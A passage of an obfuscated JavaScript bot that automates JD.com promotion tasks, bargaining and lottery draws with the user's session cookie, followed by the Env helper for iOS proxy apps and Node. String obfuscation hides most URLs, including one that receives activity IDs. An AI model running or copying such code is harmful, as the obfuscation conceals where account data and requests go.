_0x4de085={'url':_0x61ac('35','BkFL'),'headers':{'Host':_0x3c41f7[_0x61ac('36','WhA)')],'Content-Type':_0x3c41f7[_0x61ac('37','Tt8a')],'Origin':_0x3c41f7[_0x61ac('38','ERiP')],'Accept-Encoding':_0x3c41f7[_0x61ac('39','$Rif')],'Cookie':cookie,'Connection':_0x3c41f7[_0x61ac('3a','MT%7')],'Accept':_0x3c41f7[_0x61ac('3b','Hw!3')],'User-Agent':_0x3c41f7['DhxmQ'],'Referer':_0x61ac('3c','DMuq')+_0x5e595b+_0x61ac('3d','XVJ4'),'Accept-Language':_0x3c41f7[_0x61ac('3e','MT%7')]},'body':'functionId=cutPriceByUser&body={\x22activityId\x22:\x22'+_0x5e595b+_0x61ac('3f','(Bjp')+_0x46de11+_0x61ac('40','kz!]')};return new Promise(_0x4fdbfa=>{$[_0x61ac('41','O3Jy')](_0x4de085,(_0x6e2668,_0x33e954,_0x207bff)=>{if(_0x207bff){$['zRes']=JSON[_0x61ac('42','DQ9R')](_0x207bff);_0x10cc05[_0x61ac('43','2DPf')](_0x4fdbfa);};});});}function _0x3160b8(_0x5262ea,_0xe2b356){let _0x1ba617={'url':_0x3c41f7[_0x61ac('44','Ry4P')],'headers':{'Content-Type':_0x3c41f7[_0x61ac('45','$Rif')]},'body':JSON[_0x61ac('46','QK1T')]({'actID':_0x5262ea,'actsID':_0xe2b356,'done':0x1})};return new Promise(_0x35974c=>{$['post'](_0x1ba617,(_0x299566,_0x212c06,_0x512a2a)=>{_0x35974c();});});}await _0x3c41f7['OAdzr'](_0x3f19b9);if($[_0x61ac('47','uBN!')]['data'][_0x61ac('48','QK1T')]!==0x0){for(let _0x102daa=0x0;_0x3c41f7[_0x61ac('49','U(f0')](_0x102daa,$[_0x61ac('4a','fZrk')][_0x61ac('4b','O3Jy')][_0x61ac('4c','on8K')]);_0x102daa++){var _0x18a9d5=_0x3c41f7[_0x61ac('4d','Tt8a')]['split']('|'),_0x32a88c=0x0;while(!![]){switch(_0x18a9d5[_0x32a88c++]){case'0':actID=$[_0x61ac('4e','WA&R')][_0x61ac('4f','P]Ns')][_0x102daa]['actID'];continue;case'1':await $[_0x61ac('50','MT%7')](0x5dc);continue;case'2':await _0x3c41f7[_0x61ac('51','bLn5')](_0x3d77a1,actID,actsID);continue;case'3':if($[_0x61ac('52','2DPf')]&&_0x3c41f7[_0x61ac('53','Hw!3')]($['Res']['status'],0x4)){await _0x3c41f7['moOOf'](_0x3160b8,actID,actsID);}continue;case'4':actsID=$['zData'][_0x61ac('54','U(f0')][_0x102daa][_0x61ac('55','$(%#')];continue;}break;}};};};await $['wait'](0x7d0);await _0x3c41f7[_0x61ac('56','uBN!')](task);await $[_0x61ac('57','$Rif')](0x3e8);await getActInfo();if($[_0x61ac('58','XVJ4')]>0x50){$[_0x61ac('59','DQ9R')](_0x61ac('5a','e32L')+$[_0x61ac('5b','MT%7')][_0x61ac('5c','(Cz2')]+'\x0a开始抽奖');times=parseInt(_0x3c41f7['pdnFT']($[_0x61ac('5d','on8K')],0x50));for(let _0x42a233=0x0;_0x42a233<times;_0x42a233++){await _0x3c41f7[_0x61ac('5e','O3Jy')](doTask,$['taskList']['enAwardK'],_0x3c41f7['xFIUz'],0x2);await $[_0x61ac('5f','O3Jy')](0x7d0);}}}async function task(){var _0x3dd455={'RfbuM':function(_0x30d657,_0x578f07){return _0x30d657===_0x578f07;},'mYaHA':function(_0x27f9d2,_0x78a1f7){return _0x27f9d2<_0x78a1f7;},'ynKbr':function(_0x422412,_0x3142f2){return _0x422412-_0x3142f2;},'HtqKw':function(_0x499cfc,_0x55c520,_0x43c2ee,_0x4fc3da){return _0x499cfc(_0x55c520,_0x43c2ee,_0x4fc3da);},'oAyFZ':_0x61ac('60',')6Qh')};if($[_0x61ac('61',')6Qh')]['taskItemList']){$[_0x61ac('62','XVJ4')](_0x61ac('63','MT%7'));for(const _0xa794a2 of $[_0x61ac('64','rMOQ')][_0x61ac('65','[Lt6')]){if(_0x3dd455[_0x61ac('66','2DPf')](_0xa794a2['joinTimes'],0x0)){for(let _0xc0c06d=0x0;_0x3dd455[_0x61ac('67',']FwT')](_0xc0c06d,_0x3dd455[_0x61ac('68','BkFL')](_0xa794a2[_0x61ac('69','ERiP')],_0xa794a2[_0x61ac('6a','uBN!')]));_0xc0c06d++){await _0x3dd455['HtqKw'](doTask,_0xa794a2['enAwardK'],_0x3dd455[_0x61ac('6b','e*C!')],0x1);await $['wait'](0xbb8);}}}}}function doTask(_0x15810e,_0x59f40e,_0x4e92a0=0x1){var _0x3e8ba4={'wndVe':_0x61ac('6c','IYgy'),'LrFNb':function(_0xf9df8a){return _0xf9df8a();},'pnXqH':function(_0x302c2d,_0xa5db,_0x2cee43,_0x320a5f){return _0x302c2d(_0xa5db,_0x2cee43,_0x320a5f);}};return new Promise(_0x2e8f66=>{$[_0x61ac('6d','2DPf')](_0x3e8ba4[_0x61ac('6e',')6Qh')](postUrl,_0x15810e,_0x59f40e,_0x4e92a0),(_0x33556f,_0x4f7669,_0x138b07)=>{try{if(_0x33556f){$[_0x61ac('6f',']FwT')](_0x33556f);}else{if(_0x138b07){_0x138b07=JSON[_0x61ac('70','(Bjp')](_0x138b07);$['userScore']=_0x138b07[_0x61ac('71','rqJo')];$['log'](_0x138b07['promptMsg']);}else{$['logErr'](_0x3e8ba4[_0x61ac('72','DMuq')]);}}}catch(_0x4734b7){$[_0x61ac('73','uBN!')](_0x4734b7);}finally{_0x3e8ba4[_0x61ac('74','#*p7')](_0x2e8f66);}});});}function getActInfo(){var _0x5f4236={'vkQjX':'taskItemList','neYfw':function(_0x2f364e){return _0x2f364e();}};return new Promise(_0x54e5dd=>{$[_0x61ac('75','UIMz')]({'url':_0x61ac('76','@))y'),'headers':{'Cookie':cookie}},async(_0x46dd92,_0x187d12,_0x30458c)=>{try{if(_0x46dd92){$['logErr']('异常：'+JSON[_0x61ac('77','U(f0')](_0x46dd92));}else{$[_0x61ac('78','ka$n')]=JSON[_0x61ac('79',']FwT')](_0x30458c[_0x61ac('7a','XVJ4')](/window.__react_data__ = (.*)/)[0x1]);temp=$['actInfo'][_0x61ac('7b','(Cz2')][_0x61ac('7c','ERiP')];for(const _0x471097 of temp){if(_0x471097['hasOwnProperty'](_0x5f4236[_0x61ac('7d','OVVu')])){$[_0x61ac('7e','e*C!')]=_0x471097;}}}}catch(_0x2a930a){$[_0x61ac('7f','OT&]')](_0x2a930a);}finally{_0x5f4236[_0x61ac('80','e*C!')](_0x54e5dd);}});});}function postUrl(_0x4ad769,_0x378001,_0x1ff5cf=0x1){var _0x575b11={'JtDJK':function(_0x3f50e9,_0x2c2996){return _0x3f50e9===_0x2c2996;},'HDlIK':_0x61ac('81','IYgy'),'SPmib':_0x61ac('82','IYgy'),'Sdycd':'https://pro.m.jd.com/mall/active/ALBKeupJVGJhQgWujMCy8YoLUEH/index.html'};if(_0x575b11[_0x61ac('83','@))y')](_0x1ff5cf,0x2)){body=_0x61ac('84','ERiP')+_0x4ad769+_0x61ac('85','fZrk');}else{body='body=%7B%22enAwardK%22%3A%22'+_0x4ad769+_0x61ac('86','ERiP');}return{'url':_0x61ac('87','bLn5')+_0x378001,'headers':{'Host':'api.m.jd.com','Content-Type':_0x575b11['HDlIK'],'Origin':_0x61ac('88','DQ9R'),'Accept-Encoding':_0x61ac('89','#jQW'),'Cookie':cookie,'Connection':_0x61ac('8a','@))y'),'Accept':_0x575b11[_0x61ac('8b','fZrk')],'User-Agent':_0x61ac('8c','MT%7'),'Referer':_0x575b11['Sdycd'],'Accept-Language':_0x61ac('8d',')6Qh')},'body':_0x61ac('8e','BkFL')+_0x4ad769+_0x61ac('8f','O3Jy')};}function TotalBean(){var _0x28e820={'rTmvJ':'application/json,text/plain,\x20*/*','CaiNj':_0x61ac('90','nG2U'),'JArsO':_0x61ac('91','rqJo'),'oOtOs':_0x61ac('92','2DPf'),'PnaAh':'JDUA','hrKYt':_0x61ac('93','nG2U')};return new Promise(async _0x3a1677=>{var _0x10d918={'RmQUT':_0x61ac('94','IYgy'),'BAjcD':_0x61ac('95','bLn5'),'JFFkW':function(_0x11b63c){return _0x11b63c();}};const _0x2f559f={'url':_0x61ac('96','OVVu'),'headers':{'Accept':_0x28e820[_0x61ac('97','OT&]')],'Content-Type':_0x28e820[_0x61ac('98','XVJ4')],'Accept-Encoding':_0x28e820[_0x61ac('99','$(%#')],'Accept-Language':_0x61ac('9a','5CXS'),'Connection':_0x28e820[_0x61ac('9b','bLn5')],'Cookie':cookie,'Referer':_0x61ac('9c','5CXS'),'User-Agent':$[_0x61ac('9d','(Bjp')]()?process[_0x61ac('9e','bLn5')][_0x61ac('9f','#jQW')]?process[_0x61ac('a0','rMOQ')]['JD_USER_AGENT']:_0x61ac('a1',')6Qh'):$[_0x61ac('a2','rMOQ')](_0x28e820[_0x61ac('a3','$(%#')])?$[_0x61ac('a4','IYgy')](_0x61ac('a5','@))y')):_0x28e820[_0x61ac('a6','OVVu')]}};$['post'](_0x2f559f,(_0x2e90df,_0x1c5dfa,_0x4e16b5)=>{try{if(_0x2e90df){console[_0x61ac('a7',']FwT')](''+JSON[_0x61ac('a8','oWkt')](_0x2e90df));console['log']($['name']+_0x61ac('a9','pa7G'));}else{if(_0x4e16b5){_0x4e16b5=JSON[_0x61ac('aa','%29^')](_0x4e16b5);if(_0x4e16b5[_0x10d918[_0x61ac('ab','e*C!')]]===0xd){$[_0x61ac('ac','DMuq')]=![];return;}if(_0x4e16b5['retcode']===0x0){$['nickName']=_0x4e16b5[_0x10d918[_0x61ac('ad','DQ9R')]][_0x61ac('ae','IYgy')];}else{$['nickName']=$['UserName'];}}else{console['log'](_0x61ac('af','(Cz2'));}}}catch(_0x54f6ec){$[_0x61ac('b0','rqJo')](_0x54f6ec,_0x1c5dfa);}finally{_0x10d918[_0x61ac('b1','Tt8a')](_0x3a1677);}});});};_0xod1='jsjiami.com.v6';
// prettier-ignore
function Env(t,e){class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}
